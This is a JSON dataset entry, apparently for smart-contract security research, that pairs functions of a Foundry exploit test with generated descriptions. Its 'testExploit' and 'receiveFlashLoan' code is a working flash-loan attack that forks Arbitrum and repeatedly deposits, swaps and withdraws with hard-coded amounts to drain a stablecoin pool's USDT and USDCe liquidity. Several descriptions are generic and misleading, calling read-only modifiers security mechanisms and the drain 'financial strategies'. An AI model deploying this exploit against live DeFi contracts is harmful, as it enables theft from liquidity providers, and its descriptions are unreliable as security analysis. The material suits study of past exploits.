[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to retrieve and return a list of excluded artifacts. These artifacts could represent certain elements, items, or data that are intentionally left out or ignored in the context of the smart contract. The function provides a way to view this list without modifying it.\n\n2. **Security mechanism:**  \n   The function is marked as `public`, meaning it can be called by anyone, and `view`, which ensures that it does not alter the state of the contract. This prevents any unintended changes to the data. The function simply reads and returns the stored list of excluded artifacts, ensuring safe access to the information.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It directly accesses and returns the stored list of excluded artifacts (`_excludedArtifacts`) from the contract's state.\n\n4. **Return description:**  \n   The function returns an array of strings (`string[] memory`) representing the excluded artifacts. The value returned is a direct copy of the `_excludedArtifacts` list stored in the contract. No additional calculations or transformations are applied to the data before returning it.\n\nIn summary, this function serves as a simple and secure way to view the list of excluded artifacts in the contract, ensuring that the data remains unchanged and accessible to anyone who calls it."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of contract addresses that have been excluded from certain operations or rules within the smart contract. It acts as a way to retrieve and display these excluded addresses for reference or verification purposes.\n\n2. **Security mechanism:**  \n   The function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that the function is read-only and cannot be used to alter any data, providing a safe way to access the excluded contracts list.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It simply retrieves and returns the list of excluded contract addresses stored in the `_excludedContracts` variable.\n\n4. **Return description:**  \n   The function returns an array of addresses (`address[] memory excludedContracts_`). This array contains all the contract addresses that have been excluded, as stored in the `_excludedContracts` variable. The return value is a direct copy of this stored list.\n\n**In summary,**  \nThis function is a straightforward way to access and view the list of excluded contract addresses. It is secure, read-only, and does not require any input parameters, making it easy to use for checking which contracts are excluded."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": "1. **Core functions:**\n   This function is designed to provide a list of addresses that have been excluded from certain operations or interactions within the smart contract. It simply retrieves and returns the list of excluded senders stored in the contract.\n\n2. **Security mechanism:**\n   The function uses the `public` and `view` modifiers. The `public` modifier allows anyone to call this function, while the `view` modifier ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering any data.\n\n3. **Parameter Function:**\n   This function does not take any parameters. It directly accesses the internal list of excluded senders stored in the contract.\n\n4. **Return description:**\n   The function returns an array of addresses (`address[] memory excludedSenders_`). The returned array contains all the addresses that have been marked as excluded within the contract. The logic is straightforward: it retrieves the stored list of excluded senders and returns it as-is.\n\nIn summary, this function is a simple, read-only utility that provides a list of addresses excluded from certain actions in the contract, ensuring transparency and accessibility without altering the contract's state."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": "1. **Core functions**:  \n   The `failed()` function checks whether a failure condition has occurred. It first looks at a stored variable `_failed` to see if it is true. If `_failed` is not true, it then checks a specific value stored in a virtual machine (VM) at a predefined location. If either of these conditions indicates a failure, the function returns `true`; otherwise, it returns `false`.\n\n2. **Security mechanism**:  \n   - The function is marked as `view`, meaning it does not modify the state of the contract, ensuring it can be called without incurring gas costs or altering data.  \n   - It uses a virtual machine (`vm`) to load data, which adds a layer of abstraction and security by isolating the contract from direct access to sensitive storage.  \n\n3. **Parameter Function**:  \n   The function does not take any parameters. It relies solely on internal state (`_failed`) and external data loaded from the VM to determine its result.  \n\n4. **Return description**:  \n   The function returns a boolean value (`true` or `false`). It returns `true` if either the `_failed` variable is true or if the value loaded from the VM at the specified location is not zero. Otherwise, it returns `false`.  \n\nIn summary, the `failed()` function checks for a failure condition by examining both an internal state variable and an external VM storage value, returning `true` if either indicates a failure. It is designed to be secure and cost-efficient by using a `view` modifier and abstracting data access through a VM."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        USDT.approve(address(Pool), type(uint256).max);\n        USDCe.approve(address(Pool), type(uint256).max);\n        USDT_LP.approve(address(Pool), type(uint256).max);\n        USDC_LP.approve(address(Pool), type(uint256).max);\n\n        uint256[] memory potentialWithdraws = new uint256[](10);\n        potentialWithdraws[0] = 262_774_935_488;\n        potentialWithdraws[1] = 281_538_919_198;\n        potentialWithdraws[2] = 289_459_196_390;\n        potentialWithdraws[3] = 297_534_181_283;\n        potentialWithdraws[4] = 311_074_071_725;\n        potentialWithdraws[5] = 329_085_528_111;\n        potentialWithdraws[6] = 350_236_264_578;\n        potentialWithdraws[7] = 374_148_346_983;\n        potentialWithdraws[8] = 400_443_817_669;\n        potentialWithdraws[9] = 428_928_171_469;\n\n        uint8 i;\n        while (i < 10) {\n            uint256 amountDeposit1 = USDCe.balanceOf(address(USDC_LP)) * 2;\n            uint256 amountDeposit2 = USDT.balanceOf(address(USDT_LP)) * 3;\n            uint256 amountSwap1 = amountDeposit2 - amountDeposit2 / 3;\n            uint256 diffUSDT = USDT.balanceOf(address(this)) - amountDeposit1;\n            uint256 diffUSDCe = USDCe.balanceOf(address(this)) - amountDeposit2;\n\n            deposit(address(USDT), amountDeposit1);\n            deposit(address(USDCe), amountDeposit2 / 3);\n            Pool.swap(address(USDCe), address(USDT), amountSwap1, 0, address(this), block.timestamp + 1000);\n\n            // Not working logic. I leave this for the future update\n            // uint256 liquidity = USDT_LP.balanceOf(address(this));\n            // uint8 j;\n            // while (j < 20) {\n            //     uint256 doubledLiquidity = liquidity * 2;\n            //     liquidity = doubledLiquidity >> 1;\n            //     Pool.quotePotentialWithdraw(address(USDT), liquidity);\n            //     ++j;\n            // }\n\n            withdraw(address(USDT), potentialWithdraws[i]);\n\n            uint256 fromAmountUSDT = (USDT.balanceOf(address(this)) - diffUSDT) * 3;\n            Pool.swap(address(USDT), address(USDCe), fromAmountUSDT >> 2, 0, address(this), block.timestamp + 1000);\n\n            withdraw(address(USDT), USDT_LP.balanceOf(address(this)));\n\n            uint256 fromAmountUSDCe = (USDCe.balanceOf(address(this)) - diffUSDCe);\n            Pool.swap(address(USDCe), address(USDT), fromAmountUSDCe >> 1, 0, address(this), block.timestamp);\n\n            withdraw(address(USDCe), USDC_LP.balanceOf(address(this)));\n            ++i;\n        }\n        USDT.transfer(address(Vault), amounts[0]);\n        USDCe.transfer(address(Vault), amounts[1]);\n    }\n\n",
    "description": "1. **Core functions**:  \n   The `receiveFlashLoan` function is designed to handle a flash loan, which is a type of short-term borrowing in decentralized finance (DeFi). It receives tokens, performs a series of operations like depositing, swapping, and withdrawing tokens, and finally repays the loan. The function interacts with two types of tokens (USDT and USDCe) and their associated liquidity pools (USDT_LP and USDC_LP). It also includes a loop that iterates through predefined withdrawal amounts to simulate or execute certain financial strategies.\n\n2. **Security mechanism**:  \n   The function uses `approve` to grant maximum spending allowance to the `Pool` contract for the tokens involved (USDT, USDCe, USDT_LP, and USDC_LP). This ensures the `Pool` can perform necessary operations like swaps and withdrawals. The function also includes a `while` loop with a fixed iteration limit (10 times) to prevent infinite loops. Additionally, the function transfers the borrowed amounts back to the `Vault` at the end, ensuring the flash loan is repaid.\n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses involved in the flash loan.  \n   - `amounts`: An array of amounts corresponding to the tokens borrowed.  \n   - `feeAmounts`: An array of fees associated with the flash loan.  \n   - `userData`: Additional data that can be used for custom logic or configurations.  \n   These parameters provide the necessary details for the function to execute the flash loan and perform the required operations.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs a series of actions:  \n   - Approves token spending for the `Pool`.  \n   - Iterates through predefined withdrawal amounts to simulate or execute financial strategies.  \n   - Deposits, swaps, and withdraws tokens within the loop.  \n   - Transfers the borrowed amounts back to the `Vault` to repay the flash loan.  \n\n**In summary**, the `receiveFlashLoan` function is a complex financial operation that handles a flash loan, performs token-related actions, and ensures repayment. It uses approvals and loops to manage the process securely and efficiently."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 140_129_166);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDCe), \"USDCe\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Vault), \"Vault\");\n        vm.label(address(USDT_LP), \"USDT_LP\");\n        vm.label(address(USDC_LP), \"USDC_LP\");\n        vm.label(address(Pool), \"Pool\");\n        vm.label(address(SushiRouter), \"SushiRouter\");\n    }\n\n",
    "description": "1. Core functions:  \nThe `setUp` function is designed to initialize and label various addresses within a smart contract environment. It sets up a specific blockchain fork (in this case, \"arbitrum\" at block number 140,129,166) and assigns human-readable labels to different contract addresses, such as USDT, USDCe, WETH, Vault, LP (liquidity pool) tokens, and other components like the Pool and SushiRouter. This helps in organizing and identifying these addresses more easily during development or testing.\n\n2. Security mechanism:  \nThe function uses the `public` visibility modifier, meaning it can be called by anyone. However, it does not include explicit security measures like access control or checks, as it appears to be a setup function likely used in a testing or development environment rather than in a live production system. The use of `vm.createSelectFork` suggests it might be part of a testing framework, which typically operates in a controlled, non-production setting.\n\n3. Parameter Function:  \nThe function does not take any parameters. It operates solely on predefined addresses and labels them accordingly. The `vm.createSelectFork` method uses two parameters: the blockchain name (\"arbitrum\") and a specific block number (140,129,166), which defines the state of the blockchain fork being created.\n\n4. Return description:  \nThe function does not return any value. Its purpose is purely to perform setup tasks, such as creating a blockchain fork and labeling addresses, without producing an output.\n\nIn summary, the `setUp` function initializes a blockchain fork and assigns labels to various contract addresses, making them easier to identify. It is a public function without explicit security measures, likely used in a testing or development environment, and does not return any value."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of specific selectors (identifiers) for targeted artifacts. It acts as a simple retrieval mechanism, allowing users or other parts of the system to access the stored selectors without modifying them. Its primary role is to make this data available for viewing.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not alter the state of the contract or blockchain. This prevents any unintended changes to the data. Additionally, since it is `public`, it can be accessed by anyone, but the `view` modifier ensures it remains read-only.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the stored data without requiring any input from the caller.\n\n4. Return description:  \nThe function returns an array of `FuzzSelector` objects, which are stored in the `_targetedArtifactSelectors` variable. The return value is a direct copy of this stored array, providing the caller with the current list of targeted artifact selectors.\n\nIn summary,  \nThis function is a straightforward retrieval tool that provides access to a list of targeted artifact selectors. It is secure due to its read-only nature and does not require any input parameters. The output is a direct copy of the stored data, making it easy to access and use."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of targeted artifacts. It is a simple read-only function that retrieves and returns the stored list of artifacts without modifying any data. Its primary role is to allow external users or other parts of the system to access this information.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not alter the state of the contract. This makes it safe to call without worrying about unintended changes to the contract's data. Additionally, since it is marked as `public`, it can be accessed by anyone, but its read-only nature prevents any security risks associated with modifying data.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It simply retrieves and returns the stored list of targeted artifacts without requiring any input from the caller.\n\n4. **Return description:**  \n   The function returns a list of strings (`string[] memory`) that represents the targeted artifacts. The value returned is directly taken from the internal storage variable `_targetedArtifacts`, meaning it provides a snapshot of the current state of this list at the time the function is called.\n\n**In summary,**  \nThis function is a straightforward, read-only utility that allows users to access the list of targeted artifacts stored in the contract. It is secure due to its `view` modifier, requires no input parameters, and returns the current state of the `_targetedArtifacts` list."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": "1. **Core function**:  \n   This function is designed to provide a list of addresses that are being targeted or monitored by the smart contract. It allows anyone to view the addresses stored in the `_targetedContracts` array without making any changes to the contract's state.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it only reads data from the contract and does not modify it. This prevents any unintended changes to the contract's state. Additionally, since it is marked as `public`, it can be accessed by anyone, ensuring transparency.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply retrieves and returns the list of addresses stored in the `_targetedContracts` array.\n\n4. **Return description**:  \n   The function returns the entire `_targetedContracts` array, which contains the addresses of the contracts being targeted. The return value is an array of addresses (`address[] memory`), and it directly mirrors the content of the `_targetedContracts` array.\n\n**In summary**, this function is a simple read-only utility that provides access to a list of targeted contract addresses stored in the smart contract, ensuring transparency and security by not allowing any modifications to the data."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": "1. **Core functions:**  \nThis function is designed to provide a list of specific interfaces that are being targeted or focused on within the smart contract. It acts as a way to retrieve and display these interfaces for external use or inspection.\n\n2. **Security mechanism:**  \nThe function uses the `public` and `view` modifiers. The `public` modifier allows the function to be called from outside the contract, while the `view` modifier ensures that the function does not modify the state of the contract, making it read-only and safe to call without incurring gas costs.\n\n3. **Parameter Function:**  \nThis function does not take any parameters. It simply retrieves and returns the stored list of targeted interfaces.\n\n4. **Return description:**  \nThe function returns an array of `FuzzInterface` objects, which represents the list of targeted interfaces. The value returned is directly taken from the internal storage variable `_targetedInterfaces`, meaning it provides a snapshot of the current state of this variable.\n\nIn summary, this function is a straightforward read-only method that retrieves and returns a list of targeted interfaces stored in the contract, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": "1. **Core functions:**  \n   The `targetSelectors` function is designed to retrieve and return a list of specific selectors that are targeted for fuzz testing. Fuzz testing is a method used to find vulnerabilities by providing random or unexpected inputs to the system. This function essentially acts as a getter, providing access to the stored selectors that are intended for such testing.\n\n2. **Security mechanism:**  \n   The function uses the `public` and `view` modifiers. The `public` modifier allows the function to be called from outside the contract, while the `view` modifier ensures that the function does not modify the state of the contract. This makes the function read-only, preventing any unintended changes to the contract's data.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It simply retrieves and returns the stored list of targeted selectors without requiring any input from the caller.\n\n4. **Return description:**  \n   The function returns an array of `FuzzSelector` objects, which are stored in the `_targetedSelectors` variable. The return value is a direct copy of this stored array, providing the caller with the list of selectors that are targeted for fuzz testing.\n\n**In summary,**  \nThe `targetSelectors` function is a straightforward getter function that retrieves and returns a list of selectors intended for fuzz testing. It is designed to be safe and read-only, ensuring that the contract's state remains unchanged while providing access to the necessary data."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": "1. **Core functions**:  \n   The `targetSenders` function is designed to retrieve and return a list of addresses that have been marked as \"targeted senders.\" These addresses are stored in a private or internal variable called `_targetedSenders`. The function provides a way for external users or other contracts to view this list without modifying it.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data and does not perform any actions that could change the contract's storage or state. Additionally, since the function is `public`, it can be called by anyone, but the `view` modifier ensures it remains safe from unintended side effects.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It simply accesses and returns the stored list of targeted sender addresses.\n\n4. **Return description**:  \n   The function returns an array of addresses (`address[] memory`), which represents the list of targeted senders stored in the `_targetedSenders` variable. The return value is a direct copy of this list, allowing the caller to see which addresses have been marked as targeted.\n\n**In summary**, the `targetSenders` function is a read-only function that provides access to a list of addresses stored in the contract. It is secure because it does not modify the contract's state and only returns the stored data."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        USDT.approve(address(SushiRouter), type(uint256).max);\n        USDCe.approve(address(SushiRouter), type(uint256).max);\n\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(USDT);\n        tokens[1] = address(USDCe);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = USDCe.balanceOf(address(USDC_LP)) * 2;\n        amounts[1] = USDT.balanceOf(address(USDT_LP)) * 3;\n\n        Vault.flashLoan(address(this), tokens, amounts, abi.encode(1));\n        swapTokensSushi(USDT, USDT.balanceOf(address(this)));\n        swapTokensSushi(USDCe, USDCe.balanceOf(address(this)));\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an exploit scenario. It first sets up approvals for two tokens (USDT and USDCe) to allow a specific router (SushiRouter) to spend them without limits. Then, it prepares two arrays: one for the token addresses and another for the amounts to be borrowed. These amounts are calculated based on the balances of the tokens in their respective liquidity pools. Next, it triggers a flash loan from a Vault contract, using the prepared tokens and amounts. After the flash loan, it swaps the borrowed tokens using the SushiRouter. Finally, it logs the attacker's ETH balance after the exploit.\n\n2. **Security mechanism**:  \n   The function uses `approve` to grant unlimited spending permission to the SushiRouter for both USDT and USDCe tokens. This is a risky practice as it could lead to potential misuse if the router is compromised. The function also relies on `flashLoan`, which is a common DeFi feature allowing users to borrow assets temporarily. However, the function does not include explicit checks or safeguards to prevent misuse or ensure the safety of the borrowed funds. The use of `emit log_named_decimal_uint` is for logging purposes and does not contribute to security.\n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses (USDT and USDCe) involved in the exploit.  \n   - `amounts`: An array of amounts to be borrowed, calculated as multiples of the balances in the liquidity pools.  \n   - `abi.encode(1)`: Encodes a value (1) to pass additional data to the flash loan function, though its specific purpose is not clear here.  \n   - `USDT.balanceOf(address(this))` and `USDCe.balanceOf(address(this))`: These retrieve the balances of the tokens held by the contract to determine the amounts to swap.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it logs the attacker's ETH balance after executing the exploit using `emit log_named_decimal_uint`. This balance is calculated by checking the ETH held by the contract address (`address(this).balance`). The logging is purely for informational purposes and does not affect the function's logic.  \n\n**In summary**, the `testExploit` function simulates an exploit by setting up token approvals, borrowing funds via a flash loan, swapping tokens, and logging the resulting ETH balance. It lacks robust security measures and relies on risky practices like unlimited approvals. The function parameters define the tokens, amounts, and additional data used in the exploit, while the logging provides insight into the outcome."
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "quotePotentialWithdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]